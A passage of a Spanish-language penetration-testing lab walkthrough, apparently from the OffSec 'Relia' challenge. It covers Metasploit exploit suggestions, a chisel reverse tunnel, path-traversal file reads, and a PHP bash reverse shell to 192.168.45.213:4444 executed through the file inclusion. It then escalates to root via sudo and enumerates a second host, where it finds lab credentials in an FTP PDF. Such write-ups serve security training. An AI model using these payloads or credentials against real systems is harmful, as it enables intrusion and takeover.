[+] 192.168.104.246 - exploit/linux/local/ubuntu_needrestart_lpe: The target appears to be vulnerable. Vulnerable needrestart version 3.5.pre.5ubuntu2.1 detected on Ubuntu 22.04                                 
[*] Running check method for exploit 66 / 66                                                                                                                                                                      
[*] 192.168.104.246 - Valid modules for session 5:                                                                                                                                                                
============================                                                                                                                                                                                      
                                                                                                                                                                                                                  
 #   Name                                                               Potentially Vulnerable?  Check Result                                                                                                     
 -   ----                                                               -----------------------  ------------                                                                                                     
 1   exploit/linux/local/cve_2022_0847_dirtypipe                        Yes                      The target appears to be vulnerable. Linux kernel version found: 5.15.0                                          
 2   exploit/linux/local/glibc_tunables_priv_esc                        Yes                      The target appears to be vulnerable. The glibc version (2.35-0ubuntu3.1) found on the target appears to be vulnerable                                                                                                                                                                                                              
 3   exploit/linux/local/pkexec                                         Yes                      The service is running, but could not be validated.                                                              
 4   exploit/linux/local/su_login                                       Yes                      The target appears to be vulnerable.                                                                             
 5   exploit/linux/local/sudoedit_bypass_priv_esc                       Yes                      The target appears to be vulnerable. Sudo 1.9.9.pre.1ubuntu2 is vulnerable, but unable to determine editable file. Please set EDITABLEFILE option manually                                                                                                                                                                         
 6   exploit/linux/local/ubuntu_needrestart_lpe                         Yes                      The target appears to be vulnerable. Vulnerable needrestart version 3.5.pre.5ubuntu2.1 detected on Ubuntu 22.04  

```

> Abrimos un channel en meterpreter y enumeramos para verificar que exploit se adapta mejor a nuestros proposito

```msfconsole
meterpreter > shell
Process 1770 created.
Channel 122 created.
whoami
anita
ldd --version
ldd (Ubuntu GLIBC 2.35-0ubuntu3.1) 2.35
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
Written by Roland McGrath and Ulrich Drepper.
^Z
Background channel 122? [y/N]  y
meterpreter > background
[*] Backgrounding session 1...

```

* Es posible que el exploit **exploit/linux/local/glibc_tunables_priv_esc** se ajuste nuestras necesidades, intentamos ejecutarlo:

Despues de intentar no funciono :( no luck.. 

- Levantamos un tunel en .246 para ver que podemos ver, ya que hay un servidor web en ejecucion en este host.

```bash
$ ./chisel client 192.168.45.213:9001 R:9000:127.0.0.1:8000
2025/06/13 01:42:26 client: Connecting to ws://192.168.45.213:9001
2025/06/13 01:42:28 client: Connected (Latency 208.000576ms)
```
- Servidor en kali:
```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali/tools/ligolo/linux-agent]
‚îî‚îÄ# chisel server -p 9001 --reverse
2025/06/12 22:42:12 server: Reverse tunnelling enabled
2025/06/12 22:42:12 server: Fingerprint i+lBaYfvfxNFftCuW4ctsT60aZs/qF86Ig3J9EG1r/c=
2025/06/12 22:42:12 server: Listening on http://0.0.0.0:9001
2025/06/12 22:42:28 server: session#1: Client version (1.9.1) differs from server version (1.10.1-0kali1)
2025/06/12 22:42:28 server: session#1: tun: proxy#R:9000=>8000: Listening
```
- Accedemos a lo que parece ser un servidor de desarrollo interno:

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/246-machine]
‚îî‚îÄ# gobuster dir -u http://127.0.0.1:9000/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://127.0.0.1:9000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 276]
/.php                 (Status: 403) [Size: 276]
/.hta.php             (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.hta.txt             (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htaccess.html       (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess.txt        (Status: 403) [Size: 276]
/.hta.html            (Status: 403) [Size: 276]
/.htpasswd.txt        (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/.htpasswd.html       (Status: 403) [Size: 276]
/backend              (Status: 301) [Size: 315] [--> http://127.0.0.1:9000/backend/]
/css                  (Status: 301) [Size: 311] [--> http://127.0.0.1:9000/css/]
/fonts                (Status: 301) [Size: 313] [--> http://127.0.0.1:9000/fonts/]
/img                  (Status: 301) [Size: 311] [--> http://127.0.0.1:9000/img/]
/index.php            (Status: 200) [Size: 4948]
/index.php            (Status: 200) [Size: 4948]
/js                   (Status: 301) [Size: 310] [--> http://127.0.0.1:9000/js/]
/server-status        (Status: 200) [Size: 23332]
Progress: 18456 / 18460 (99.98%)
===============================================================
Finished
===============================================================
```
- Probamos hacer un fuzz sobre los parametros empezando por  **backend**

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/246-machine]
‚îî‚îÄ# ffuf -u 'http://127.0.0.1:9000/backend/?FUZZ=../../../../etc/passwd' -w parameters.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://127.0.0.1:9000/backend/?FUZZ=../../../../etc/passwd
 :: Wordlist         : FUZZ: /home/kali/OffSec/Challenges/2_Relia/246-machine/parameters.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

id                      [Status: 302, Size: 757, Words: 164, Lines: 35, Duration: 353ms]
file                    [Status: 302, Size: 757, Words: 164, Lines: 35, Duration: 354ms]
page                    [Status: 302, Size: 757, Words: 164, Lines: 35, Duration: 354ms]
post                    [Status: 302, Size: 757, Words: 164, Lines: 35, Duration: 352ms]
user                    [Status: 302, Size: 757, Words: 164, Lines: 35, Duration: 354ms]
view                    [Status: 200, Size: 757, Words: 164, Lines: 35, Duration: 354ms]
blog                    [Status: 302, Size: 757, Words: 164, Lines: 35, Duration: 354ms]
:: Progress: [7/7] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```
> Parece que el parametro view responde con status **200**

#### Explicacion del posible vector

> Este vector de ataque implica movimiento lateral con el usuario www-data

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/246-machine]
‚îî‚îÄ# curl 'http://127.0.0.1:9000/backend/?view=../../../../../../../../../etc/passwd'      
...
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
offsec:x:1000:1000:Offsec Admin:/home/offsec:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
anita:x:1001:1001:Anita:/home/anita:/bin/sh
...

```

- Confirmamos lectura de archivos:
```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/246-machine]
‚îî‚îÄ# curl "http://127.0.0.1:9000/backend/?view=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts"
...
127.0.0.1 localhost
127.0.1.1 demo

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
...

```
#### Este comando comprueba... ?
```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/246-machine]
‚îî‚îÄ# curl 'http://127.0.0.1:9000/backend/?view=../../../../../../../../proc/self/status' | grep -i uid
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2139  100  2139    0     0   5779      0 --:--:-- --:--:-- --:--:--  5781
Uid:    33      33      33      33

```
#### Otro comando a entender

```
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/246-machine]
‚îî‚îÄ# curl 'http://127.0.0.1:9000/backend/?view=../../../../../../../../../etc/apache2/sites-enabled/000-default.conf'


<VirtualHost *:80>
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request's Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        #ServerName www.example.com

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
        # error, crit, alert, emerg.
        # It is also possible to configure the loglevel for particular
        # modules, e.g.
        #LogLevel info ssl:warn

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        # For most configuration files from conf-available/, which are
        # enabled or disabled at a global level, it is possible to
        # include a line for only one particular virtual host. For example the
        # following line enables the CGI configuration for this host only
        # after it has been globally disabled with "a2disconf".
        #Include conf-available/serve-cgi-bin.conf
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```
- Podemos buscar archivos manualmente que sean modificables:
```bash
/backend/?view=../../../../../../../../tmp/
/backend/?view=../../../../../../../../var/tmp/
/backend/?view=../../../../../../../../dev/shm/
/backend/?view=../../../../../../../../var/www/html/uploads/
/backend/?view=../../../../../../../../home/anita/
/backend/?view=../../../../../../../../home/offsec/
```
Tenemos confirmado un LFI (Local File Inclusion) accesible desde el backend web, que corre bajo el usuario www-data.
La clave en este vector es identificar un punto de convergencia entre lo que el usuario anita (shell actual) puede escribir, y lo que el proceso web (Apache2, corriendo como www-data) puede leer.
Esto habilita t√©cnicas como file injection o code inclusion, si el contenido escrito por anita es luego le√≠do o interpretado por el servidor web.
De los procesos observados, Apache2 est√° lanzado como root, pero sus workers corren como www-data. Esto es normal y no representa una vulnerabilidad directa, pero significa que archivos le√≠dos desde el LFI se ejecutan o muestran con ese contexto.
Como prueba de concepto (PoC):

    Es escribible por anita.

    Es legible por www-data (via LFI).

En contraste, /tmp fue escribible por anita pero no legible por www-data en este entorno, posiblemente por restricciones de montaje (como privateTmp o noexec).
- Necesitamos enumerar directorios escribibles por anita:
```bash
$ find / -writable -user anita 2>/dev/null
/tmp
... todos los proc
/home/anita
/home/anita/.bash_logout
/home/anita/.profile
/home/anita/.ssh
/home/anita/.ssh/authorized_keys
/home/anita/.bash_history
/home/anita/.cache
/home/anita/.cache/motd.legal-displayed
/home/anita/.bashrc
/home/anita/chisel
/dev/shm
/dev/pts/1
/dev/pts/0
```
- Filtramos por directorios en memoria compartida:
```bash
$ mount | grep tmpfs
udev on /dev type devtmpfs (rw,nosuid,relatime,size=954892k,nr_inodes=238723,mode=755,inode64)
tmpfs on /run type tmpfs (rw,nosuid,nodev,noexec,relatime,size=202340k,mode=755,inode64)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev,inode64)
tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k,inode64)
tmpfs on /run/snapd/ns type tmpfs (rw,nosuid,nodev,noexec,relatime,size=202340k,mode=755,inode64)
tmpfs on /run/user/1001 type tmpfs (rw,nosuid,nodev,relatime,size=202336k,nr_inodes=50584,mode=700,uid=1001,gid=1001,inode64)
$ 
```

- La idea es probar con LFI que es legible por www-data
```bash
$ echo "POC_TMP" > /tmp/poc.txt
$ cat /tmp/poc.txt
POC_TMP
$ echo "POC_DEV_SHM" > /dev/shm/poc.txt    
$ cat /dev/shm/poc.txt
POC_DEV_SHM
```

- Desde kali:
1. Descartamos /tem

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/246-machine]
‚îî‚îÄ# curl 'http://127.0.0.1:9000/backend/?view=../../../../../../../../tem/poc.txt'    

<!DOCTYPE html>
<html >
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Backend</title>

  <link rel="stylesheet" href="../css/bootstrap.min.css" />
  <style>
    .panel-default {
        opacity: 0.9;
        margin-top:30px;
    }
    .form-group.last {
        margin-bottom:0px;
    }
    </style>
    <script src="/js/backend.js"></script>
</head>
<body>
  <div class="container">
    <div class="row">
        <div class="col-md-4 col-md-offset-7">
            <div class="panel panel-default">

            <div class="panel-footer">Not Registered? <a href="#" class="">Register here</a>
                </div>
            </div>
        </div>
    </div>
</div>
</body>
</html>

```
2. Confirmamos **/dev/shm**
```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/246-machine]
‚îî‚îÄ# curl 'http://127.0.0.1:9000/backend/?view=../../../../../../../../dev/shm/poc.txt'

<!DOCTYPE html>
<html >
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Backend</title>

  <link rel="stylesheet" href="../css/bootstrap.min.css" />
  <style>
    .panel-default {
        opacity: 0.9;
        margin-top:30px;
    }
    .form-group.last {
        margin-bottom:0px;
    }
    </style>
    <script src="/js/backend.js"></script>
</head>
<body>
  <div class="container">
    <div class="row">
        <div class="col-md-4 col-md-offset-7">
            <div class="panel panel-default">

POC_DEV_SHM
            <div class="panel-footer">Not Registered? <a href="#" class="">Register here</a>
                </div>
            </div>
        </div>
    </div>
</div>
</body>
</html>
```

### Procedemos a escribir un shell en /dev/shm desde anita:

1. Escribimos el shell:

```bash
$ echo "<?php system(\"bash -c 'bash -i >& /dev/tcp/192.168.45.213/4444 0>&1'\"); ?>" > /dev/shm/rce.php
```
2. Ejecutamos el receptor nc:
```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/246-machine]
‚îî‚îÄ# nc -lvnp 4444
listening on [any] 4444 ...
...
```
3. Ejecutamos el shell por LFI
```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/246-machine]
‚îî‚îÄ# curl "http://127.0.0.1:9000/backend/?view=../../../../../../../../dev/shm/rce.php"
```
4. Recibimos el shell:
```bash
connect to [192.168.45.213] from (UNKNOWN) [192.168.104.246] 49600
bash: cannot set terminal process group (863): Inappropriate ioctl for device
bash: no job control in this shell
www-data@demo:/var/www/internal/backend$ whoami
whoami
www-data
www-data@demo:/var/www/internal/backend$ 
```
#### Buscamos escalar privilegios:
```bash
www-data@demo:/var/www/internal/backend$ find / -perm -4000 -type f 2>/dev/null
<nal/backend$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/chsh
/usr/bin/pkexec
/usr/bin/mount
/usr/bin/chfn
/usr/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/fusermount3
/usr/bin/gpasswd
/usr/bin/sudo                                                                                               
/usr/libexec/polkit-agent-helper-1                                                                          
/usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                 
/usr/lib/openssh/ssh-keysign                                                                                
/usr/lib/snapd/snap-confine                                                                                 
/snap/core20/1695/usr/bin/chfn                                                                              
/snap/core20/1695/usr/bin/chsh                                                                              
/snap/core20/1695/usr/bin/gpasswd                                                                           
/snap/core20/1695/usr/bin/mount                                                                             
/snap/core20/1695/usr/bin/newgrp                                                                            
/snap/core20/1695/usr/bin/passwd                                                                            
/snap/core20/1695/usr/bin/su                                                                                
/snap/core20/1695/usr/bin/sudo                                                                              
/snap/core20/1695/usr/bin/umount
/snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1695/usr/lib/openssh/ssh-keysign
/snap/core20/1623/usr/bin/chfn
/snap/core20/1623/usr/bin/chsh
/snap/core20/1623/usr/bin/gpasswd
/snap/core20/1623/usr/bin/mount
/snap/core20/1623/usr/bin/newgrp
/snap/core20/1623/usr/bin/passwd
/snap/core20/1623/usr/bin/su
/snap/core20/1623/usr/bin/sudo
/snap/core20/1623/usr/bin/umount
/snap/core20/1623/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1623/usr/lib/openssh/ssh-keysign
/snap/snapd/17336/usr/lib/snapd/snap-confine
/snap/snapd/17029/usr/lib/snapd/snap-confine
www-data@demo:/var/www/internal/backend$ ls -la /etc/passwd
ls -la /etc/passwd
-rw-r--r-- 1 root root 1806 Oct 12  2022 /etc/passwd
www-data@demo:/var/www/internal/backend$ sudo -l
sudo -l
Matching Defaults entries for www-data on demo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on demo:
    (ALL) NOPASSWD: ALL
www-data@demo:/var/www/internal/backend$ sudo su
sudo su
whoami
root
cd /root
ls
proof.txt
snap
cat proof.txt
a4aaa27336459a518f3c2a5285ce1b9a

```

## WEB02 

> Continuamos segun el orden de prioridad que dimos segun responsabilidades por **WEB02**

#### Escaneo de puertos y servicios:

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/247-machine]
‚îî‚îÄ# nmap -sV -p- -T4 192.168.104.247 -oN ports-services.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-13 17:57 -03
Nmap scan report for 192.168.104.247
Host is up (0.16s latency).
Not shown: 65518 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)                                                                                                                             
135/tcp   open  msrpc         Microsoft Windows RPC                                                                                                                                                               
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                                                                                       
443/tcp   open  ssl/http      Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)                                                                                                                             
445/tcp   open  microsoft-ds?                                                                                                                                                                                     
3389/tcp  open  ms-wbt-server Microsoft Terminal Services                                                                                                                                                         
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                                                                             
14020/tcp open  ftp           FileZilla ftpd                                                                                                                                                                      
14080/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                                                                             
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                                                                             
49664/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                               
49665/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                               
49666/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                               
49667/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                               
49668/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                               
49669/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                               
49670/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                               
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                                                                                                                                                          
                                                                                                                                                                                                                  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                                    
Nmap done: 1 IP address (1 host up) scanned in 823.23 seconds  
```
#### Agresive scann:

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/247-machine]
‚îî‚îÄ# nmap -A 192.168.104.247 -oN A-scan.txt                 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-13 18:25 -03
Nmap scan report for 192.168.104.247
Host is up (0.16s latency).
Not shown: 909 closed tcp ports (reset), 84 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_http-title: RELIA - New Hire Information
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-title: RELIA - New Hire Information
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WEB02
|   NetBIOS_Domain_Name: WEB02
|   NetBIOS_Computer_Name: WEB02
|   DNS_Domain_Name: WEB02
|   DNS_Computer_Name: WEB02
|   Product_Version: 10.0.20348
|_  System_Time: 2025-06-13T21:26:28+00:00
|_ssl-date: 2025-06-13T21:26:36+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=WEB02
| Not valid before: 2025-04-23T04:53:29
|_Not valid after:  2025-10-23T04:53:29
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-06-13T21:26:32
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   156.81 ms 192.168.45.1
2   156.77 ms 192.168.45.254
3   158.51 ms 192.168.251.1
4   158.60 ms 192.168.104.247

```

#### Directorios

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali/OffSec/Challenges/2_Relia]
‚îî‚îÄ# gobuster dir -u 192.168.104.247 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.104.247
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 341] [--> http://192.168.104.247/img/]
/assets               (Status: 301) [Size: 344] [--> http://192.168.104.247/assets/]
/css                  (Status: 301) [Size: 341] [--> http://192.168.104.247/css/]
/pdfs                 (Status: 301) [Size: 342] [--> http://192.168.104.247/pdfs/]
/js                   (Status: 301) [Size: 340] [--> http://192.168.104.247/js/]
/examples             (Status: 503) [Size: 405]
/licenses             (Status: 403) [Size: 424]
/dashboard            (Status: 301) [Size: 347] [--> http://192.168.104.247/dashboard/]
/%20                  (Status: 403) [Size: 305]
/IMG                  (Status: 301) [Size: 341] [--> http://192.168.104.247/IMG/]
/Assets               (Status: 301) [Size: 344] [--> http://192.168.104.247/Assets/]
/PDFs                 (Status: 301) [Size: 342] [--> http://192.168.104.247/PDFs/]
/*checkout*           (Status: 403) [Size: 305]
/CSS                  (Status: 301) [Size: 341] [--> http://192.168.104.247/CSS/]
/Img                  (Status: 301) [Size: 341] [--> http://192.168.104.247/Img/]
/JS                   (Status: 301) [Size: 340] [--> http://192.168.104.247/JS/]
/phpmyadmin           (Status: 403) [Size: 305]
/webalizer            (Status: 403) [Size: 305]
/*docroot*            (Status: 403) [Size: 305]
/*                    (Status: 403) [Size: 305]
/con                  (Status: 403) [Size: 305]
/Dashboard            (Status: 301) [Size: 347] [--> http://192.168.104.247/Dashboard/]
/http%3A              (Status: 403) [Size: 305]
/**http%3a            (Status: 403) [Size: 305]
/*http%3A             (Status: 403) [Size: 305]
/xampp                (Status: 301) [Size: 343] [--> http://192.168.104.247/xampp/]
/aux                  (Status: 403) [Size: 305]
/**http%3A            (Status: 403) [Size: 305]
/%C0                  (Status: 403) [Size: 305]
/server-status        (Status: 403) [Size: 424]
/%3FRID%3D2671        (Status: 403) [Size: 305]
/devinmoore*          (Status: 403) [Size: 305]
/PDFS                 (Status: 301) [Size: 342] [--> http://192.168.104.247/PDFS/]
/200109*              (Status: 403) [Size: 305]
/*sa_                 (Status: 403) [Size: 305]
/*dc_                 (Status: 403) [Size: 305]
/login%3f             (Status: 403) [Size: 305]
/%22james%20kim%22    (Status: 403) [Size: 305]
/%22britney%20spears%22 (Status: 403) [Size: 305]
/%22julie%20roehm%22  (Status: 403) [Size: 305]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

#### Exploramos el servidor ftp

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/247-machine]
‚îî‚îÄ# ftp 192.168.104.247 -P 14020
Connected to 192.168.104.247.
220 RELIA FTP Server for DEV resources. Please contact your manager for access.
Name (192.168.104.247:kali): anonymous
331 Password required for anonymous
Password: 
230 Logged on
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||49788|)
150 Connection accepted
-r--r--r-- 1 ftp ftp         237639 Nov 04  2022 umbraco.pdf
226 Transfer OK
ftp> 
```
* En el pdf encontramos credenciales de configuracion de **Umbraco** 

   - User: mark@relia.com
   - Password: OathDeeplyReprieve91
   - Subdominio: WEB02.relia.com

```pdf
# fragmento del pdf
For Umbraco 7 the requirements are
o IIS 7 or higher
‚Ä¢ Database, one of the following: SQL CE, SQL Server 2008 or higher or MySQL with support
for case insensitive queries)
‚Ä¢ ASP.NET 4.5 or 4.5.1. Full-Trust
‚Ä¢ Ability to set file/folder permissions for the user that "owns" the Application Pool
‚Ä¢ You can use the user account "mark" (@relia.com) for basic configuration of the Umbraco
instances on IIS servers (pass "OathDeeplyReprieve91").
o Please DO NOT share this password with anyone outside the dev team.
‚Ä¢ IIS is configured to only allow access to Umbraco using the server FQDN at the moment.
o e.g. web02.relia.com, not just web02.
```	
#### Configuramos el subdominio:
```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/247-machine]
‚îî‚îÄ# echo "192.168.104.247 web02.relia.com" | sudo tee -a /etc/hosts
192.168.104.247 web02.relia.com
```

#### Buscamos un exploit para Umbraco
```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/247-machine]
‚îî‚îÄ# searchsploit umbraco                               
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Umbraco CMS - Remote Command Execution (Metasploit)                                                                                                                             | windows/webapps/19671.rb
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                                                                                                                      | aspx/webapps/46153.py
Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)                                                                                                                      | aspx/webapps/49488.py
Umbraco CMS 8.9.1 - Directory Traversal                                                                                                                                         | aspx/webapps/50241.py
Umbraco CMS SeoChecker Plugin 1.9.2 - Cross-Site Scripting                                                                                                                      | php/webapps/44988.txt
Umbraco v8.14.1 - 'baseUrl' SSRF                                                                                                                                                | aspx/webapps/50462.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

